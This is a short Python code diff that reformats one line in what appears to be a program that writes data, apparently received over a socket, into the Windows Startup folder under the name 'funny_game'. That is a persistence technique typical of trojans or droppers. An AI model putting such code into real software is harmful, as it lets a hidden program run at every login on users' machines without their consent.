@@ -113,8 +113,7 @@ my_socket.send(signal)
 user_name = os.getlogin()
 location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
            "\\Windows\\Start Menu\\Programs\\" \
-           "Startup\\funny_game".format(
-    user_name)
+           "Startup\\funny_game".format(user_name)
 with open(location, "wb") as f:
     done = False
     while not done:
